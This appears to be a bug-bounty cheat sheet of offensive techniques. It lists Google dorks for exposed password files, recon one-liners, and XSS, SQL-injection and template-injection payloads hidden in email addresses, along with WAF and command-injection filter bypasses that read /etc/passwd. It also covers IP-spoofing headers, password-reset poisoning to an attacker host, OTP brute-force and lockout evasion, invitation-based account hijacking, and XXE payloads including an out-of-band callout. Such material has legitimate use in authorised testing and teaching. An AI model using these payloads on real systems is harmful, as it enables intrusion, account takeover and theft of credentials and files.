# Google Dorks
```
- Login panel search
- Admin panel search
- Search for exposed files
- Open directories (Index of)
- Exposed admin directories
- Exposed password directories
- Mail directories
- Directories with passwords
- .htaccess files
- .txt files with passwords
- Database files
- Log files
- External sites linking to target:

- Explore these resources for more dorks:

Pentest-Tools Google Hacking
https://lnkd.in/dE_TmCpS

Exploit-DB Google Hacking Database
https://lnkd.in/dSm8mi3E
```

Login panel search
```
site:target[.]com inurl:admin | administrator | adm | login | l0gin | wp-login
```
```
intitle:"login" "admin" site:target[.]com
```

Admin panel search
```
inurl:admin site:target[.]com
```

Search for exposed files
```
site:target[.]com ext:txt | ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv | ext:mdb
```

Open directories (Index of)
```
intitle:"index of /" Parent Directory site:target[.]com
```

Exposed admin directories
```
intitle:"index of /admin" site:target[.]com
```

Exposed password directories
```
intitle:"index of /password" site:target[.]com
```

Mail directories
```
intitle:"index of /mail" site:target[.]com
```

Directories with passwords
```
intitle:"index of /" (passwd | password.txt) site:target[.]com
```
.htaccess files:
```
intitle:"index of /" .htaccess site:target[.]com
```
.txt files with passwords
```
inurl:passwd filetype:txt site:target[.]com
```
Database files
```
inurl:admin filetype:db site:target[.]com
```
Log files
```
filetype:log site:target[.]com
```
External sites linking to target
```
link:target[.]com -site:target[.]com
```

# Recon Scripts
```
- Heartbleed oneline Scanner
- Extract URLs from junk data or JS files
- Unpack an APK file and extract juicy info
- Remotely List or extract files from a ZIP hosted on a web server
- Automate subdomain discovery (Mix of Amass, Subfinder, Assetfinder = Powerful combo)
- Fast check for HTTP response status and size
- Script to Chain multiple tools to find reflected XSS

```
Heartbleed oneline Scanner

Quickly check a list of hosts for the infamous Heartbleed vulnerability (CVE-2014-0160)., Leaks server memory. Use it wisely.
```
cat list.txt | while read line ; do echo "QUIT" | openssl s_client -connect $line:443 2>&1 | grep 'server extension "heartbeat" (id=15)' || echo $line: safe; done
```

Extract URLs from junk data or JS files
```
grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" file.txt
```
```
curl http://target[.]com/file.js | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"
```

Unpack an APK file and extract juicy info

API keys, secrets, hardcoded credentials—this one finds them all.
```
apktool d app.apk
grep -EHirn "accesskey|api_key|password|token|X509TrustManager" APKfolder/
```

Remotely List or extract files from a ZIP hosted on a web server

Works if the server supports HTTP range requests.
```
pip install remotezip
remotezip -l "http://target[.]com/bigfile.zip"
remotezip "http://target[.]com/bigfile.zip" "loot.txt"
```

Automate subdomain discovery (Mix of Amass, Subfinder, Assetfinder = Powerful combo)

```
amass enum --passive -d target[.]com -o domains
assetfinder --subs-only target[.]com | tee -a domains
subfinder -d target[.]com -o subfinder_domains
cat subfinder_domains >> domains
sort -u domains > final_domains.txt
cat final_domains.txt | filter-resolved > alive_domains.txt
```

Fast check for HTTP response status and size

Curl + Parallel = Recon Beast
```
cat alive.txt | parallel -j50 -q curl -w 'Status:%{http_code}\tSize:%{size_download}\t%{url_effective}\n' -o /dev/null -sk
```

Script to Chain multiple tools to find reflected XSS

Required tools: Subfinder, Amass, KXSS, WaybackURLs, Httprobe.
```
subfinder -d target[.]com -o subs
amass enum --passive -d target[.]com -o amass_subs
cat subs amass_subs | filter-resolved | tee resolved.txt
cat resolved.txt | httprobe -p http:81 -p http:8080 -p https:8443 | waybackurls | kxss > xss.txt
```

# E-mail Address Payloads
```
- XSS
- Template Injection
- SQL Injection
- SSRF
- Parameter Pollution
- Email Header Injection:
```

XSS

```
test+(<​script>alert(0)<​/script>)@example[.]com

test@example(<​script>alert(0)<​/script>).com

"<​script>alert(0)<​/script>"@example[.]com
```
Template Injection:
```
"<%= 7 * 7 %>"@example[.]com

test+(${{7*7}})@example[.]com
```
SQL Injection:
```
"' OR 1=1 -- '"@example[.]com

"mail'); DROP TABLE users;--"@example[.]com
```
SSRF
```
john.doe@abc123[.]burpcollaborator[.]net

john.doe@[127[.]0[.]0[.]1]
```
Parameter Pollution
```
victim&email=attacker@example[.]com
```
Email Header Injection
```
"%0d%0aContent-Length:%200%0d%0a%0d%0a"@example[.]com

"recipient@test[.]com>\r\nRCPT TO:<victim+"@test[.]com
```

# Sensitive Data Leak via .json
```
- Try changing the request to .json:
```

Try changing the request to .json:
```
Request 1:

GET /ResetPassword HTTP/1.1
{"email":"victim@example[.]com"}
Response: 200 OK


Request 2:

GET /ResetPassword.json HTTP/1.1
{"email":"victim@example[.]com"}
Response:
{"success":"true","token":"596a96-cc7bf-9108c-d896f-33c44a-edc8a"}

```

# Authentication Bypass 
```
- Try using a header
- Find Access Tokens using ffuf + gau
- Use Scan Check Builder Burp extension – extract accessToken or access_token.
- Validate tokens (with KeyHacks).(https://github.com/streaak/keyhacks)
- Also scan for .php, .json, and other files.
```
Try using a header
```
Request:

GET /delete?user=test HTTP/1.1
X-Custom-IP-Authorization: 127[.]0[.]0[.]1
Response: 302 Found
```

Find Access Tokens using ffuf + gau:
```
Gather URLs:
cat hosts | sed 's/https\?:\/\///' | gau > urls.txt

Filter JS files:
cat urls.txt | grep -P "\w+\.js(\?|$)" | sort -u > jsurls.txt

Fuzz and replay to Burp:
ffuf -mc 200 -w jsurls.txt:HFUZZ -u HFUZZ -replay-proxy http://127[.]0[.]0[.]1:8080
```

# XSS WAF Bypass Techniques
```
- If a WAF blocks javascript
- XSS Firewall Bypass Techniques
```

If a WAF blocks javascript
```
1. → java\nscript: → Add \n, \t, or \r inside

2. → \x01javascript​: → Add low ASCII chars (\x00–\x20) in front

3. → jaVAscrIpt​: → Mix upper and lowercase letters
```

XSS Firewall Bypass Techniques
```
1. → Mix cases:
<​sCRipT>alert(1)<​/sCRiPt>

2. → Use CRLF (\r\n):
<​script>%0d%0aalert(1)<​/script>

3. → Double encode:
%2522

4. → Test recursive filters:
<scr<​script>ipt>alert(1)</scr<​/script>ipt>

5. → No-whitespace anchor tag:
<a/href="j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt​:alert(1)">

6. → Bullet char to bypass whitespace:
<svg•onload=alert(1)>

7. → Change request method:
Try POST instead of GET
```

# XSS Payload: Alert Obfuscation (RegEx Bypass)

# Command Injection Filter Bypass Cheatsheet

```
cat /etc/passwd
cat /e"t"c/pa"s"swd
cat /'e'tc/pa's'swd
cat /etc/pa??wd
cat /etc/pa*wd
cat /et' 'c/passw' 'd
cat /et$()c/pa$()$swd
cat /et${neko}c/pas${poi}swd
{cat,/etc/passwd}
echo "dwssap/cte/ tac" | rev
$(echo Y2FOIC9ldGMvcGFzc3dkCg== | base64 -d)
w\ho\am\i
/\b\i\n/////s\h
who$@ami
xyz%0Acat%20/etc/passwd
IFS=,;`cat<<<uname,-a`
/???/??t /???/p??s??
test=/ehhh/hmtc/pahhh/hmsswd
cat ${test//hhh\/hm/}
cat ${test//hh??hm/}
```

# Top 10 File Upload Attack Possibilities
```
ASP / ASPX / PHP5 / PHP / PHP3 → Webshell / RCE

SVG → Stored XSS / SSRF / XXE

GIF → Stored XSS / SSRF

CSV → CSV injection

XML → XXE

AVI → LFI / SSRF

HTML / JS → HTML injection / XSS / Open Redirect

PNG / JPEG → Pixel Flood Attack (DoS)

ZIP → RCE via LFI / DoS

PDF / PPTX → SSRF / Blind XXE
```

# CSRF

```
# 1️⃣ Swap "POST" with "GET": 
Instead of using POST requests, switch to GET and move the body parameters into the URI. This simple maneuver often overrides CSRF token implementations, enabling a full-blown CSRF attack.

# 2️⃣ JSON Requests: 
Even JSON requests relying on cookies can be vulnerable to CSRF. Here's the trick: send your request with a content-type of text/html and format the body in JSON. In some cases, if the application doesn't rely on the content-type header, CSRF can still work its magic.

# 3️⃣ Don't Blindly Trust CSRF Tokens: 
Just because an application has a CSRF token doesn't mean it's foolproof. Sometimes, backend validation for these tokens can be flawed. This means that even with the same token, a CSRF attack may still work on other users' accounts.

# 4️⃣ Remove the CSRF Token Parameter:
Believe it or not, some applications are designed to support legacy versions. If you try removing the CSRF token parameter from the request, it may still work. This is often because apps have dual implementations, and if the parameter is missing, they fall back to the legacy version to support older versions of the app, which can often be vulnerable.

# 5️⃣ Legacy Endpoints: 
Hidden in JS files are legacy endpoints that may no longer be actively in use, but they can still be functional and vulnerable to CSRF attacks. These abandoned endpoints are usually not maintained or updated to the latest security standards, making them prime targets for CSRF exploitation.
```

# Forgot Password / Login Page 

```
- Test Forgot Password Feature
- Bypass bypass rate limit restrictions on authentication endpoints
- Bypass Account lockout
```

**Test Forgot Password Feature**
```

# 1️⃣ Token and username parameter: 
Some target apps often generate a password reset link containing a token and a username parameter. In such cases, request a password reset link on your attacker account, navigate to it, and attempt to replace the "username" parameter with the victim's username. Try resetting the password using your token. This is frequently one of the most common issues I've encountered that leads to an Account Takeover (ATO).

# 2️⃣ Password reset poisoning: 
Request a password reset using the victim's account and alter the "Host" header of the request to https://attackercontrolledsite(.)com. If the target app is vulnerable, this will trigger an email to the victim with a password link pointing to your server (e.g., https://attackercontrolledsite(.)com?token=dsksdjsdjsdjdsjdsjsd. When the victim clicks on this link, you will receive the password reset token, paving the way for an ATO.

# 3️⃣ HTTP Parameter Pollution: 
When requesting a password reset, always attempt to pass multiple email parameters (e.g., email=victim@target(.)com&email=attacker@target(.)com). Depending on how the application's backend is set up, it may have different routines running on various servers to check validity and send emails. Consequently, it could inadvertently send the password reset link of victim@target(.)com to attacker@target(.)com.

```

**Bypass bypass rate limit restrictions on authentication endpoints**
```
# 1️⃣ 🕵️‍♀️ Google Captchas implemented? 
No worries, always try removing the captcha parameter or replace it with null and send the request without the captcha. Sometimes a fallback method allows you to get past the captcha requirement, making it vulnerable to a lack of rate limiting.

# 2️⃣ 🌐 IP restricted? 
Check if your IP was blocked and attempt to make a request using a different IP. If that works, you're in luck! You can usually bypass these limitations through IP rotation. Services like Brightproxy or Burp Suite IP rotate extension can assign a new IP address with every request.

# 3️⃣ 🤖 If nothing works, try appending %0d or %0d before the username (e.g., %0dvictim@target.com). 
This can sometimes trick the server into checking if %0dvictim@target.com is locked. If not, while processing the login attempt, it strips the %0d and makes an attempt for victim@target.com. It's possible that %0dvictim@target.com may be blocked too after 5 attempts. In that case, keep appending an additional %0d after every 5 attempts (e.g., %0d%0dvictim@target.com and vice versa).

# 4️⃣ 🤯 Rate limit properly implemented? 
Always look for an alternative login or forgot password endpoint. This could be on one of the target's mobile apps or a legacy endpoint in the JS file.

```

**Bypass Account lockout**

Brute Force OTP by Changing parameters - for example 
```

Navigated to the target app and entered a phone number to log in. An OTP was sent to the phone. Intercepted the request and noticed two request body parameters: Phone and CountryCode.Changed the "CountryCode" from +971 to +1, kept the same phone number, and entered the correct "OTP," and it logged me into my account with +971 country code.

This seemed a bit unusual, as it demonstrated that something was wrong since the country code was not being factored or was being stripped off while actually logging someone into an account. But it sort of made sense because the app supported only one country phone number. But then why add the country code to the request if it's not being used at all?

Came up with some creative ideas and said to myself, "Let's try brute-forcing the 4-digit OTP." Looks like the limit was set to 5 attempts after which the account would get locked out.

Came up with another wild imagination: What if the country code was somehow incorrectly being used here to determine what identifier to lockout?

Figured out that I could change the country code to +971, +1, +91, etc., while keeping the same phone number and brute force the OTP, and it never locked my account. This is possibly because there was a design flaw where they were checking for multiple failed attempts with both +[country code][phone#], something like that, while the country code was stripped off for actually validating the OTP with the phone number and during login, as we learned earlier.
```

# Host Header Injection
```
- Inject Other Supported header
- Wrong Origin
- Completely change GET path
- Add line wrapping
```
**Inject Other Supported header**
```
Client-IP: 127.0.0.1
Forwarded-For-Ip: 127.0.0.1
Forwarded-For: 127.0.0.1
Forwarded-For: localhost
Forwarded: 127.0.0.1
Forwarded: localhost
True-Client-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Forward-For: 127.0.0.1
X-Forward: 127.0.0.1
X-Forward: localhost
X-Forwarded-By: 127.0.0.1
X-Forwarded-By: localhost
X-Forwarded-For-Original: 127.0.0.1
X-Forwarded-For-Original: localhost
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: localhost
X-Forwarded-Server: 127.0.0.1
X-Forwarded-Server: localhost
X-Forwarded: 127.0.0.1
X-Forwarded: localhost
X-Forwared-Host: 127.0.0.1
X-Forwared-Host: localhost
X-Host: 127.0.0.1
X-Host: localhost
X-HTTP-Host-Override: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-Addr: localhost
X-Remote-IP: 127.0.0.1
```
**Wrong Origin**
```
X-Original-URL: /admin
X-Override-URL: /admin
X-Rewrite-URL: /admin
Referer: /admin
```
**Completely change GET path**
```
GET https://vulnerable-website.com HTTP/1.1
Host: http://evil-website.com
```
**Add line wrapping**
```
GET /index.php HTTP/1.1
Host: http://vulnerable-website.com
 Host: http://evil-website.com
```

# Invitiation link & Email Verification Bypass
```
- Email Verification Bypass
- Regsiter victim without his involvement / Account hijacking via invitation flow / Pre-Account Takeover
- invitation link has no expiry
```
**Email Verification Bypass**

```
Identify Features Dependent on Email Domain:
Identify critical features linked to a user's email domain. For instance, consider a target app that grants access to resources based on your email domain. Some apps let you join a team or workspace directly if your email matches the team's domain (e.g., join Victim SITE XYZ only with sample@victimsitexyz[.]com). Others restrict access to documents or videos based on email domain whitelisting. Numerous such opportunities exist where email plays a crucial role.

Here's a simple trick that often works to bypass email verification and claim an unregistered email on any domain:

1️⃣ Log in to your attacker account and change your email address to an attacker-controlled email (e.g., attackeremail@attackerdomain.com). 

2️⃣ You'll likely receive an email confirmation link on your attacker-controlled email (Do not verify it yet). 

3️⃣ Now, change your email to the unregistered email or domain you wish to HIJACK (e.g., victimemail@victimdomain.com). 

4️⃣ This action will send an email verification link to victimemail@victimdomain.com, which you don't have access to. 

5️⃣ Try clicking on the "Email" verification link sent earlier to attackeremail@attackerdomain.com. If the system fails to revoke the previous email verification link, the link for attackeremail@attackerdomain.com could end up verifying the email for victimemail@victimdomain.com, allowing you to claim it as verified.

Once you've claimed an email associated with another organization's domain, identify the associated functions to prove impact and report it to earn some generous bounties!

Numerous similar misconfigurations exist that you can leverage to bypass email verification checks.

```
**Regsiter victim without his involvement / Account hijacking via invitation flow / Pre-Account Takeover**

```
Here are the prerequisites that must be met to proceed with these attacks:

1️⃣ Ensure your target app supports inviting team members within the application. 

2️⃣ Verify that your target app allows account signup without email verification, or identify an email verification bypass vulnerability.

Here's my approach to identifying and reporting these issues:

1️⃣ Log in to your account and invite a new team member, e.g., testaccount@example.com (Ensure this account isn't registered on the platform). 

2️⃣ This typically sends an invitation link to testaccount@example.com to sign up and join the team by accepting the invite. 

3️⃣ To test if the target app is vulnerable, disregard the invitation email link and attempt to sign up for an account directly using testaccount@example.com, assuming no email verification is required on the target app or that you've identified an email verification bypass. 

4️⃣ Once logged in to the target app, you'll likely discover an invitation that enables you to accept it on behalf of the victim, granting unauthorized access to the team with the assigned role (e.g., admin, team, etc.), resulting in a significant security impact.

The issue here is that anyone can sign up using an email that hasn't been registered on the platform yet but is awaiting a pending invitation, possibly with an admin role or another role in an organization. 

`Unlike a regular pre-account takeover, this one is far more Impactful as it affects an existing business flow. A person shouldn't have the ability to sign up and claim someone else's in-progress Invite. The consequences are far worse than a pre ato.`

`However, the flow here is that an attacker can collect all emails of an org that uses the service and sign up using all those accounts and hope for an account sitting there that hasn’t accepted an invitation yet.`


Another Scenarios I have encountered is: 
1. Send invite to test@example.com
2. Disregard Invite, directly signup.
3. test@example.com becomes part of the organisation.
4. Victim organisation dashboard still shows that test@example.com hasn’t accepted the invitation sent to email. 
5. But in real time test@example.com remains part of the organisation anonymously.

```

**invitation link has no expiry**
```

If you're working on a target that offers user invitations via an invitation link, you might be surprised by how often these simple issues go unnoticed and unreported. In my early days, I reported over 10+ similar issues to programs, earning me quick wins and $$$!

Here's how you can turn this feature into a reportable security issue: 

1️⃣ Generate an invitation link and send it to your secondary account to join the team. 
2️⃣ Accept the invitation. 
3️⃣ Remove the secondary user from the team. 
4️⃣ Try to rejoin the organization using the same invitation link, and prepare to be amazed!

This issue allows an individual to rejoin the organization with the same role, even after removal. If the invitation link has no expiry and is not revoked on removal, it poses a security risk, granting access back to the organization with the same privileges as before.

Low/Medium - It all depends on the product. Think about it this way. A H1 employee that was a triager once was later fired or quit his job. Now what If he can use an outdated Invite link to regain access? The Impact can vary depending on the target app and the underlying functions.
```

# XXE

Payloads - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
```
-  top 5 list of features and areas you should keep an eye on when testing for XXE issues
-  blind XXE by loading a remote resource such as a Burp Collaborator.
-  Convert JSON to XML (Content Type)
```

top 5 list of features and areas you should keep an eye on when testing for XXE issues
```
# 1️⃣ XML APIs -  
Test target apps and see If XML is being used or alternatively try replacing content-type: application/json to application/xml or text/xml with a XML body

# 2️⃣ SOAP APIs - 
Working on a target app that supports SOAP? Test for XXE payloads 

# 3️⃣ SAML Authentication - 
Test XXE on the SAML flow

# 4️⃣ HTML parsing (e.g., converting HTML to some other file type)

# 5️⃣ SVG File Upload - 
Assuming that the app supports SVG file upload and parses SVG. You can try this payload https://gist.github.com/jakekarnes42/b879f913fd3ae071c11199b9bd7ba3a7?short_path=f3432ae 

These areas often conceal potential XXE vulnerabilities waiting to be uncovered. 
```

blind XXE by loading a remote resource such as a Burp Collaborator.
```
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://BURP_COLLABORATOR[.]burpcollaborator[.]net/x"> %ext;
]>
```

Convert JSON to XML (Content Type)
```
# The target app was exclusively using application/json. A typical request looked like this:

Request:
POST /v1/organizations/ HTTP/1.1
Host: target(.)com
Content-Type: application/json

{"search":"Id","value":"1"}

Response:
{"description": "ID 1 not found"}


#  changed the Content-Type header to application/xml:

Request:

POST /v1/organizations/ HTTP/1.1
Host: target(.)com
Content-Type: application/xml

{"search":"Id","value":"1"}

Response:
{"errors":{"errorMessage":"org.xml.sax.SAXParseException: XML document structures must start and end within the same entity."}}


# The error hinted at the server's ability to process XML. A crucial revelation. Building on this, I converted the JSON body to XML:

From:

{"search":"Id","value":"1"}

To:

<?xml version="1.0" encoding="UTF-8" ?>
<root>
  <search>Id</search>
  <value>1</value>
</root>

#  Sending a request with the new XML payload, the server still responded as expected:

Request:

POST /v1/organizations/ HTTP/1.1
Host: http://target.com
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8" ?>
<root>
  <search>Id</search>
  <value>1</value>
</root>

Response:
{"description": "ID 1 not found"}


# Confident in the server's XML input acceptance, it was time for the final attack:

Request:

POST /v1/organizations/ HTTP/1.1
Host: target(.)com
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
  <search>Id</search>
  <value>&xxe;</value>
</root>

Response:

{"description": "ID root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys.... not found"}
```